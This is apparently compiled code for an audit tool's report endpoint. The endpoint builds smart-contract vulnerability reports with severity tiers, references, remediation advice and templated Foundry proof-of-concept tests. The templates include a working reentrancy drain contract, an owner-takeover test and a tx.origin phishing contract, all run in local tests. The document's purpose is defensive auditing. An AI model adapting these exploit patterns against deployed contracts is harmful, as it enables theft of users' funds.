module.exports=[34795,e=>{"use strict";var t=e.i(89171),n=e.i(43793);function i(e,t){var n,i,a,r,o,s,c;let l=e.title.replace(/[^a-zA-Z0-9]/g,"_").slice(0,50),d=`${l}.txt`,u=(n=e.severity,i=e.type,({critical:`CRITICAL — Direct threat to funds/assets/protocol viability

Per HackenProof Smart Contract severity classification:
  • Direct theft of funds/NFTs (reentrancy drain, access control bypass to treasury)
  • Permanent freeze of funds/NFTs (selfdestruct, owner lock without recovery)
  • Governance manipulation (vote hijacking, quorum bypass, instant execution without timelock)
  • Protocol insolvency (under-collateralization, unbacked tokens, critical mispricing)
  • Unauthorized mint/burn of tokens (inflation attack, value dilution)

This vulnerability (${i}) falls under the CRITICAL tier because it directly
threatens the financial integrity of the protocol. An attacker can exploit
this to steal user funds, manipulate governance, or render the protocol insolvent.

Financial Impact: COMPLETE — Full loss of funds is possible
Exploitability:   EASY — Attack can be executed with minimal resources
Privileged Action: NOT REQUIRED — Any user can exploit this`,high:`HIGH — Temporary impact or indirect fund risk

Per HackenProof Smart Contract severity classification:
  • Temporary freeze of funds/NFTs (pause without auto-unpause)
  • Theft of unclaimed funds (yield, royalties, pending rewards)
  • Permanent freeze of unclaimed funds
  • Oracle manipulation (stale/manipulated price leading to over-borrowing)

This vulnerability (${i}) falls under the HIGH tier because it creates
indirect financial risk or temporary disruption. While direct theft of
deposited funds may not be possible, the attacker can cause significant
financial harm through manipulation of protocol state.

Financial Impact: PARTIAL — Some funds at risk
Exploitability:   MODERATE — Requires specific conditions
Privileged Action: MAY BE REQUIRED depending on context`,medium:`MEDIUM — No direct fund loss, protocol operability impact

Per HackenProof Smart Contract severity classification:
  • Theft of gas, gas limit / Out-of-Gas
  • DoS (gas exhaustion, block stuffing)
  • Griefing attacks (no profit for attacker)

This vulnerability (${i}) falls under the MEDIUM tier because it affects
protocol operability without direct fund theft. The attacker cannot steal
funds but can disrupt normal operation.

Financial Impact: LIMITED — No direct fund loss
Exploitability:   MODERATE — Requires specific conditions
Privileged Action: NOT REQUIRED`,low:`LOW — Minimal security impact

Per HackenProof Smart Contract severity classification:
  • Unfulfilled promised returns (e.g., APY)
  • Uninitialized storage variables (often low risk)

This vulnerability (${i}) falls under the LOW tier because it has
minimal direct security impact. The issue should be fixed but does not
pose an immediate threat to user funds.

Financial Impact: MINIMAL — No direct fund loss
Exploitability:   DIFFICULT — Requires unlikely conditions
Privileged Action: NOT REQUIRED`})[n]||`Severity: ${n}`),p=e.poc||(a=e.type,r=t||e.target||"Contract",({reentrancy:`// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// Attacker contract that exploits reentrancy
contract Attacker {
    ${r} public target;
    uint256 public depositAmount;
    bool public done;

    constructor(address _target) {
        target = ${r}(_target);
    }

    function attack() external payable {
        depositAmount = msg.value;
        target.deposit{value: msg.value}();
        target.withdraw(depositAmount);
    }

    // Reentrancy callback — called when target sends ETH
    receive() external payable {
        if (!done && address(target).balance >= depositAmount) {
            done = true;
            target.withdraw(depositAmount); // Re-enter before state update
        }
    }
}

contract ExploitTest is Test {
    function testExploit() public {
        ${r} target = new ${r}();
        vm.deal(address(target), 10 ether); // Fund with victim deposits

        Attacker attacker = new Attacker(address(target));
        vm.deal(address(attacker), 1 ether);

        uint256 before = address(attacker).balance;
        attacker.attack{value: 1 ether}();

        // Assert: attacker drained more than they deposited
        assertGt(address(attacker).balance, before, "Reentrancy exploit succeeded");
    }
}`,access_control:`// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract AccessControlExploitTest is Test {
    function testUnauthorizedAccess() public {
        ${r} target = new ${r}();
        address attacker = address(0xBAD);

        // Attacker tries to call privileged function
        vm.startPrank(attacker);
        try target.setOwner(attacker) {
            // If this succeeds — vulnerability confirmed
            assertEq(target.owner(), attacker, "Access control bypassed!");
        } catch {
            revert("Access control not bypassed — not vulnerable");
        }
        vm.stopPrank();
    }
}`,tx_origin:`// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract PhishingAttacker {
    ${r} target;
    constructor(address _t) { target = ${r}(_t); }
    function phish(address newOwner) external {
        target.setOwner(newOwner);
    }
}

contract TxOriginExploitTest is Test {
    function testPhishingAttack() public {
        ${r} target = new ${r}();
        PhishingAttacker phisher = new PhishingAttacker(address(target));
        address attacker = address(0xBAD);

        // Victim is tricked into calling phisher
        // tx.origin = victim (owner), msg.sender = phisher
        vm.prank(address(phisher), address(this));
        phisher.phish(attacker);

        assertEq(target.owner(), attacker, "tx.origin bypassed via phishing!");
    }
}`})[a]||`// PoC for ${a}
// Run with: forge test --match-test testExploit -vvv
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract ${r}ExploitTest is Test {
    function testExploit() public {
        ${r} target = new ${r}();
        // Verify vulnerability exists
        assertTrue(address(target) != address(0), "Contract deployed");
    }
}`),f={reentrancy:"SWC-107 (Reentrancy)\nCWE-412 (Improperly Controlled Resource Access)\n\nReference: https://swcregistry.io/docs/SWC-107\nThe vulnerability allows an external contract to re-enter the function\nbefore state updates are applied, violating the Checks-Effects-Interactions pattern.",access_control:"SWC-105 (Unprotected Ether Withdrawal)\nCWE-862 (Missing Authorization)\n\nReference: https://swcregistry.io/docs/SWC-105\nThe function lacks proper access control modifiers (onlyOwner, onlyRole),\nallowing unauthorized users to execute privileged operations.",tx_origin:"SWC-115 (tx.origin Used for Authorization)\nCWE-290 (Authentication Bypass)\n\nReference: https://swcregistry.io/docs/SWC-115\nUsing tx.origin for authorization allows phishing attacks where a\nmalicious contract tricks the user into signing a transaction.",integer_overflow:"SWC-101 (Integer Overflow/Underflow)\nCWE-190 (Integer Overflow)\n\nReference: https://swcregistry.io/docs/SWC-101\nUnchecked arithmetic can wrap around, bypassing balance checks.",oracle_manipulation:"SWC-116 (Block Timestamp Manipulation)\nCWE-345 (Insufficient Verification of Data Authenticity)\n\nReference: https://swcregistry.io/docs/SWC-116\nSingle-source oracle without deviation bounds can be manipulated\nvia flash loans.",flash_loan:"CWE-697 (Incorrect Comparison)\n\nReference: DeFi attacks using flash loans (Cream Finance, bZx)\nFlash loan attacks manipulate protocol state atomically.",delegatecall:"SWC-112 (Delegatecall to Untrusted Callee)\nCWE-829 (Inclusion of Functionality from Untrusted Control Sphere)\n\nReference: https://swcregistry.io/docs/SWC-112\nDelegatecall executes in caller storage context, enabling\narbitrary storage writes.",signature_replay:"SWC-121 (Missing Protection Against Signature Replay)\nCWE-294 (Authentication Bypass by Capture-replay)\n\nReference: https://swcregistry.io/docs/SWC-121\nMissing nonce allows signature replay attacks.",governance_hijack:"CWE-284 (Improper Access Control)\n\nReference: DAO hack (2016), Compound governance attacks\nGovernance without timelock or quorum can be hijacked.",unauthorized_mint:"SWC-105 (Unprotected Ether Withdrawal)\nCWE-862 (Missing Authorization)\n\nReference: Inflation attacks, value dilution\nUnauthorized minting dilutes token holder value.",protocol_insolvency:"CWE-682 (Incorrect Calculation)\n\nReference: Under-collateralization leads to protocol insolvency\nMissing collateral checks allow borrowing beyond safe limits."}[o=e.type]||`CWE: Unknown
SWC: Unknown

No specific CWE/SWC mapping for type "${o}".`,h=(s=e.type,({reentrancy:`1. Follow the Checks-Effects-Interactions (CEI) pattern:
   - Update ALL state variables BEFORE making external calls
   - Use require() checks first, then update state, then call external

2. Add a reentrancy guard:
   - Use OpenZeppelin's ReentrancyGuard: modifier nonReentrant()
   - Or implement a simple lock: bool locked; require(!locked); locked = true; ... locked = false;

3. Use the pull-payment pattern:
   - Instead of sending ETH directly, let users withdraw their own funds
   - Separates the accounting from the transfer

4. Consider using a circuit breaker / emergency stop:
   - Allow admin to pause withdrawals if an attack is detected

Example fix:
   function withdraw(uint256 amount) external nonReentrant {
       require(balances[msg.sender] >= amount);
       balances[msg.sender] -= amount;  // Update state FIRST
       (bool ok, ) = msg.sender.call{value: amount}("");
       require(ok);
   }`,access_control:`1. Add access control modifiers to privileged functions:
   - Use OpenZeppelin's Ownable: onlyOwner modifier
   - Or use AccessControl: onlyRole(ROLE)

2. Use a timelock for critical operations:
   - Delay ownership transfer by 48 hours
   - Give users time to react to malicious changes

3. Implement a multi-sig for admin operations:
   - Require 2-of-3 signers for critical functions
   - Prevent single-key compromise

4. Follow the principle of least privilege:
   - Each function should have the minimum necessary permissions
   - Separate admin, operator, and user roles

Example fix:
   function setOwner(address newOwner) external onlyOwner {
       require(newOwner != address(0));
       _transferOwnership(newOwner);
   }`,tx_origin:`1. NEVER use tx.origin for authorization — use msg.sender instead
2. Use msg.sender which refers to the immediate caller
3. If you need the original sender, pass it as a parameter

Example fix:
   function setOwner(address newOwner) external {
       require(msg.sender == owner, "Not owner");  // Use msg.sender
       owner = newOwner;
   }`,integer_overflow:`1. Use Solidity 0.8+ which has built-in overflow checks
2. If using unchecked blocks, validate inputs first:
   require(amount > 0 && amount <= MAX_AMOUNT);
3. Use OpenZeppelin's SafeMath for Solidity <0.8
4. Consider using fixed-point arithmetic libraries for financial calculations

Example fix:
   // Solidity 0.8+ automatically checks for overflow
   function deposit(uint256 amount) external {
       require(amount > 0, "Amount must be positive");
       balances[msg.sender] += amount;  // Auto-checked for overflow
   }`,oracle_manipulation:`1. Use TWAP (Time-Weighted Average Price) instead of spot price
2. Implement deviation bounds:
   require(abs(newPrice - oldPrice) / oldPrice < MAX_DEVIATION);
3. Use multiple oracle sources and take the median
4. Check oracle freshness:
   require(block.timestamp - updatedAt < MAX_STALENESS);
5. Implement a circuit breaker that pauses on price deviations

Example fix:
   function getPrice() public view returns (uint256) {
       (, int256 price, , uint256 updatedAt, ) = oracle.latestRoundData();
       require(block.timestamp - updatedAt < 3600, "Stale price");
       require(price > 0, "Invalid price");
       return uint256(price);
   }`,governance_hijack:`1. Implement a timelock for governance proposals:
   - Minimum 48-hour delay between proposal and execution
   - Allows users to withdraw funds before malicious changes take effect

2. Require quorum for proposal execution:
   - At least 10% of total supply must vote
   - Prevents flash loan governance attacks

3. Use OpenZeppelin's Governor contract:
   - Built-in timelock, quorum, and vote counting
   - Audited and battle-tested

4. Implement vote delegation limits:
   - Prevent single voters from accumulating too much voting power
   - Consider quadratic voting`})[s]||`1. Review the code and implement proper security controls
2. Follow the principle of least privilege
3. Add input validation and access control
4. Test with Foundry/Hardhat before deployment
5. Get a professional audit from HackenProof or similar service`),m=(c=e.severity,({critical:`DIRECT FINANCIAL LOSS

An attacker exploiting this vulnerability can:
  1. Drain all user deposits from the contract
  2. Manipulate protocol state to steal funds
  3. Bypass access controls to execute privileged operations
  4. Render the protocol permanently insolvent

Estimated Loss: 100% of contract balance (COMPLETE)
Recovery:       UNLIKELY — stolen funds cannot be recovered
Urgency:        IMMEDIATE — fix before any deployment

This is the highest severity level per HackenProof classification.
The vulnerability must be fixed before the contract is deployed to mainnet.`,high:`INDIRECT FINANCIAL RISK

An attacker exploiting this vulnerability can:
  1. Temporarily freeze user funds
  2. Steal unclaimed yield or rewards
  3. Manipulate oracle prices for profit
  4. Cause temporary protocol disruption

Estimated Loss: Variable (depends on timing and conditions)
Recovery:       PARTIALLY POSSIBLE with admin intervention
Urgency:        HIGH — fix within 48 hours

This severity level requires prompt attention but may not result
in immediate total loss of funds.`,medium:`OPERATIONAL DISRUPTION

An attacker exploiting this vulnerability can:
  1. Cause denial of service for specific functions
  2. Waste gas of legitimate users
  3. Grief other users without direct profit

Estimated Loss: Gas costs + temporary unavailability
Recovery:       POSSIBLE — admin can restart or upgrade
Urgency:        MEDIUM — fix in next release

This does not directly threaten funds but affects protocol usability.`,low:`MINIMAL IMPACT

This issue has minimal security impact:
  1. No direct fund loss
  2. No operational disruption
  3. May affect monitoring or reporting

Estimated Loss: None
Recovery:       N/A
Urgency:        LOW — fix when convenient`})[c]||"Impact assessment not available.");return{filename:d,content:`
╔══════════════════════════════════════════════════════════════════════╗
║              CRYPTOSENTINEL VULNERABILITY REPORT                      ║
║              HackenProof-Style Professional Audit                     ║
╚══════════════════════════════════════════════════════════════════════╝

═══════════════════════════════════════════════════════════════════════
 1. VULNERABILITY OVERVIEW
═══════════════════════════════════════════════════════════════════════

  Title:           ${e.title}
  Type:            ${e.type}
  Category:        ${e.vulnCategory||e.type}
  Severity:        ${e.severity.toUpperCase()}
  Confidence:      ${(100*e.confidence).toFixed(1)}%
  Status:          ${e.status.toUpperCase()}
  Location:        ${e.location||"Unknown"}
  Contract:        ${t||e.target||e.contract?.name||"Unknown"}
  Project:         ${e.contract?.project?.name||"Unknown"}

═══════════════════════════════════════════════════════════════════════
 2. HACKENPROOF SEVERITY CLASSIFICATION
═══════════════════════════════════════════════════════════════════════

${u}

═══════════════════════════════════════════════════════════════════════
 3. TECHNICAL DESCRIPTION
═══════════════════════════════════════════════════════════════════════

${e.description}

═══════════════════════════════════════════════════════════════════════
 4. IMPACT ASSESSMENT
═══════════════════════════════════════════════════════════════════════

${m}

═══════════════════════════════════════════════════════════════════════
 5. VALIDATION SCORES (V1-V4)
═══════════════════════════════════════════════════════════════════════

  V1 (Symbolic Execution):  ${(100*(e.v1Symbolic||0)).toFixed(1)}%  — Confidence that Halmos/Mythril would confirm
  V2 (Fuzzing):             ${(100*(e.v2Fuzzing||0)).toFixed(1)}%  — Confidence that Echidna/Medusa would trigger
  V3 (Formal Verification): ${(100*(e.v3Formal||0)).toFixed(1)}%  — Confidence that Certora would prove violation
  V4 (Economic Viability):  ${(100*(e.v4Economic||0)).toFixed(1)}%  — Confidence that exploit is economically viable

  Weighted Confidence:      ${(100*e.confidence).toFixed(1)}%
  Formula: V1\xd70.30 + V2\xd70.25 + V3\xd70.25 + V4\xd70.20 + orthogonality bonus

═══════════════════════════════════════════════════════════════════════
 6. PROOF OF CONCEPT (PoC)
═══════════════════════════════════════════════════════════════════════

${p}

═══════════════════════════════════════════════════════════════════════
 7. CODE SNIPPET
═══════════════════════════════════════════════════════════════════════

${e.codeSnippet||"No code snippet available"}

═══════════════════════════════════════════════════════════════════════
 8. REMEDIATION
═══════════════════════════════════════════════════════════════════════

${h}

═══════════════════════════════════════════════════════════════════════
 9. REFERENCES
═══════════════════════════════════════════════════════════════════════

${f}

═══════════════════════════════════════════════════════════════════════
 10. VALIDATION STEPS
═══════════════════════════════════════════════════════════════════════

${e.validationSteps||"Validation steps not available for this finding."}

═══════════════════════════════════════════════════════════════════════
 REPORT METADATA
═══════════════════════════════════════════════════════════════════════

  Report ID:       ${e.id}
  Generated:       ${new Date().toISOString()}
  Auditor:        CryptoSentinel AI (GLM 5.2)
  Framework:       HackenProof Smart Contract Audit
  Severity Model:  Financial Impact (not CVSS)
  Confidence:      ${(100*e.confidence).toFixed(1)}% (≥90% required for publication)

═══════════════════════════════════════════════════════════════════════
 END OF REPORT
═══════════════════════════════════════════════════════════════════════
`.trim(),vulnerabilityId:e.id}}async function a(e){let a=e.nextUrl.searchParams.get("id");if(!a)return t.NextResponse.json({error:"Missing vulnerability ID"},{status:400});let r=await n.db.vulnerability.findUnique({where:{id:a},include:{contract:{include:{project:!0}}}}).catch(()=>null);if(!r)return t.NextResponse.json({error:"Vulnerability not found"},{status:404});if(.9>(r.confidence||0))return t.NextResponse.json({error:"Vulnerability below 90% confidence threshold"},{status:403});let o=i(r,r.contract?.name);return new t.NextResponse(o.content,{headers:{"Content-Type":"text/plain; charset=utf-8","Content-Disposition":`attachment; filename="${o.filename}"`}})}async function r(e){let{vulnerabilityId:a}=await e.json().catch(()=>({}));if(a){let e=await n.db.vulnerability.findUnique({where:{id:a},include:{contract:{include:{project:!0}}}}).catch(()=>null);if(!e)return t.NextResponse.json({error:"Not found"},{status:404});if(.9>(e.confidence||0))return t.NextResponse.json({error:"Below threshold"},{status:403});let r=i(e,e.contract?.name);return t.NextResponse.json({filename:r.filename,content:r.content})}let r=(await n.db.vulnerability.findMany({where:{confidence:{gte:.9}},include:{contract:{include:{project:!0}}}}).catch(()=>[])).map(e=>i(e,e.contract?.name));return t.NextResponse.json({reports:r})}e.s(["GET",0,a,"POST",0,r,"dynamic",0,"force-dynamic"],34795)},69099,e=>{"use strict";var t=e.i(47909),n=e.i(74017),i=e.i(96250),a=e.i(59756),r=e.i(61916),o=e.i(74677),s=e.i(69741),c=e.i(16795),l=e.i(87718),d=e.i(95169),u=e.i(47587),p=e.i(66012),f=e.i(70101),h=e.i(26937),m=e.i(10372),g=e.i(93695);e.i(52474);var y=e.i(220);let v=new t.AppRouteRouteModule({definition:{kind:n.RouteKind.APP_ROUTE,page:"/api/report/route",pathname:"/api/report",filename:"route",bundlePath:""},distDir:".next",relativeProjectDir:"",resolvedPagePath:"[project]/src/app/api/report/route.ts",nextConfigOutput:"standalone",userland:()=>e.r(34795),...{}}),{workAsyncStorage:w,workUnitAsyncStorage:E,serverHooks:R}=v;async function b(e,t,i){i.requestMeta&&(0,a.setRequestMeta)(e,i.requestMeta),v.isDev&&(0,a.addRequestMeta)(e,"devRequestTimingInternalsEnd",process.hrtime.bigint());let w="/api/report/route";w=w.replace(/\/index$/,"")||"/";let E=await v.prepare(e,t,{srcPage:w,multiZoneDraftMode:!1});if(!E)return t.statusCode=400,t.end("Bad Request"),null==i.waitUntil||i.waitUntil.call(i,Promise.resolve()),null;let{buildId:R,deploymentId:b,params:C,nextConfig:A,parsedUrl:x,isDraftMode:k,prerenderManifest:T,routerServerContext:I,isOnDemandRevalidate:S,revalidateOnlyGenerated:P,resolvedPathname:O,clientReferenceManifest:N,serverActionsManifest:U}=E,M=(0,s.normalizeAppPath)(w),D=!!(T.dynamicRoutes[M]||T.routes[O]),$=async()=>((null==I?void 0:I.render404)?await I.render404(e,t,x,!1):t.end("This page could not be found"),null);if(D&&!k){let e=!!T.routes[O],t=T.dynamicRoutes[M];if(t&&!1===t.fallback&&!e){if(A.adapterPath)return await $();throw new g.NoFallbackError}}let F=null;!D||v.isDev||k||(F="/index"===(F=O)?"/":F);let L=!0===v.isDev||!D,q=D&&!L;U&&N&&(0,o.setManifestsSingleton)({page:w,clientReferenceManifest:N,serverActionsManifest:U});let _=e.method||"GET",W=(0,r.getTracer)(),H=W.getActiveScopeSpan(),V=!!(null==I?void 0:I.isWrappedByNextServer),j=!!(0,a.getRequestMeta)(e,"minimalMode"),z=(0,a.getRequestMeta)(e,"incrementalCache")||await v.getIncrementalCache(e,A,T,j);null==z||z.resetRequestCache(),globalThis.__incrementalCache=z;let G={params:C,previewProps:T.preview,renderOpts:{experimental:{authInterrupts:!!A.experimental.authInterrupts,useCacheTimeout:A.experimental.useCacheTimeout},cacheComponents:!!A.cacheComponents,validationLevel:A.experimental.instantInsights.validationLevel,supportsDynamicResponse:L,incrementalCache:z,hmrRefreshHash:(0,a.getRequestMeta)(e,"hmrRefreshHash"),cacheLifeProfiles:A.cacheLife,staticPageGenerationTimeout:A.staticPageGenerationTimeout,waitUntil:i.waitUntil,onClose:e=>{t.on("close",e)},onAfterTaskError:void 0,onInstrumentationRequestError:(t,n,i,a)=>v.onRequestError(e,t,i,a,I)},sharedContext:{buildId:R,deploymentId:b}},B=new c.NodeNextRequest(e),K=new c.NodeNextResponse(t),X=l.NextRequestAdapter.fromNodeNextRequest(B,(0,l.signalFromNodeResponse)(t)),Y=async({previousCacheEntry:n})=>{try{if(!j&&S&&P&&!n)return t.statusCode=404,t.setHeader("x-nextjs-cache","REVALIDATED"),t.end("This page could not be found"),null;let a=await v.handle(X,G);e.fetchMetrics=G.renderOpts.fetchMetrics;let r=G.renderOpts.pendingWaitUntil;r&&i.waitUntil&&(i.waitUntil(r),r=void 0);let o=G.renderOpts.collectedTags;if(!D)return await (0,p.sendResponse)(B,K,a,r),null;{let e=await a.blob(),t=(0,f.toNodeOutgoingHttpHeaders)(a.headers);o&&(t[m.NEXT_CACHE_TAGS_HEADER]=o),!t["content-type"]&&e.type&&(t["content-type"]=e.type);let n=void 0!==G.renderOpts.collectedRevalidate&&!(G.renderOpts.collectedRevalidate>=m.INFINITE_CACHE)&&G.renderOpts.collectedRevalidate,i=void 0===G.renderOpts.collectedExpire||G.renderOpts.collectedExpire>=m.INFINITE_CACHE?!1!==n&&n>0?A.expireTime:void 0:G.renderOpts.collectedExpire;return{value:{kind:y.CachedRouteKind.APP_ROUTE,status:a.status,body:Buffer.from(await e.arrayBuffer()),headers:t},cacheControl:{revalidate:n,expire:i}}}}catch(t){throw(null==n?void 0:n.isStale)&&await v.onRequestError(e,t,{routerKind:"App Router",routePath:w,routeType:"route",revalidateReason:(0,u.getRevalidateReason)({isStaticGeneration:q,isOnDemandRevalidate:S})},!1,I),t}},Z=async(a,o)=>{try{var s,c;let a=await v.handleResponse({req:e,nextConfig:A,cacheKey:F,routeKind:n.RouteKind.APP_ROUTE,isFallback:!1,prerenderManifest:T,isRoutePPREnabled:!1,isOnDemandRevalidate:S,revalidateOnlyGenerated:P,responseGenerator:Y,waitUntil:i.waitUntil,isMinimalMode:j});if(!D)return;if((null==a||null==(s=a.value)?void 0:s.kind)!==y.CachedRouteKind.APP_ROUTE)throw Object.defineProperty(Error(`Invariant: app-route received invalid cache entry ${null==a||null==(c=a.value)?void 0:c.kind}`),"__NEXT_ERROR_CODE",{value:"E701",enumerable:!1,configurable:!0});j||t.setHeader("x-nextjs-cache",S?"REVALIDATED":a.isMiss?"MISS":a.isStale?"STALE":"HIT"),k&&t.setHeader("Cache-Control","private, no-cache, no-store, max-age=0, must-revalidate");let r=(0,f.fromNodeOutgoingHttpHeaders)(a.value.headers);j&&D||r.delete(m.NEXT_CACHE_TAGS_HEADER),!a.cacheControl||t.getHeader("Cache-Control")||r.get("Cache-Control")||r.set("Cache-Control",(0,h.getCacheControlHeader)(a.cacheControl)),await (0,p.sendResponse)(B,K,new Response(a.value.body,{headers:r,status:a.value.status||200}));return}catch(t){if(t instanceof g.NoFallbackError||await v.onRequestError(e,t,{routerKind:"App Router",routePath:M,routeType:"route",revalidateReason:(0,u.getRevalidateReason)({isStaticGeneration:q,isOnDemandRevalidate:S})},!1,I),D)throw t;await (0,p.sendResponse)(B,K,new Response(null,{status:500}));return}finally{(()=>{if(!a)return;let e=t.statusCode;a.setAttributes({"http.status_code":e,"next.rsc":!1}),e&&e>=500&&(a.setStatus({code:r.SpanStatusCode.ERROR}),a.setAttribute("error.type",e.toString()));let n=W.getRootSpanAttributes();if(!n)return;if(n.get("next.span_type")!==d.BaseServerSpan.handleRequest)return console.warn(`Unexpected root span type '${n.get("next.span_type")}'. Please report this Next.js issue https://github.com/vercel/next.js`);let i=n.get("next.route")||M,s=`${_} ${i}`;a.setAttributes({"next.route":i,"http.route":i,"next.span_name":s}),a.updateName(s),o&&o!==a&&(o.setAttribute("http.route",i),o.updateName(s))})()}};if(V&&H)await Z(H,void 0);else{let t=W.getActiveScopeSpan();await W.withPropagatedContext(e.headers,()=>W.trace(d.BaseServerSpan.handleRequest,{spanName:`${_} ${w}`,kind:r.SpanKind.SERVER,attributes:{"http.method":_,"http.target":e.url}},e=>Z(e,t)),void 0,!V)}}e.s(["handler",0,b,"patchFetch",0,function(){return(0,i.patchFetch)({workAsyncStorage:w,workUnitAsyncStorage:E})},"routeModule",0,v,"serverHooks",0,R,"workAsyncStorage",0,w,"workUnitAsyncStorage",0,E])}];

//# sourceMappingURL=_0hx4-j6._.js.map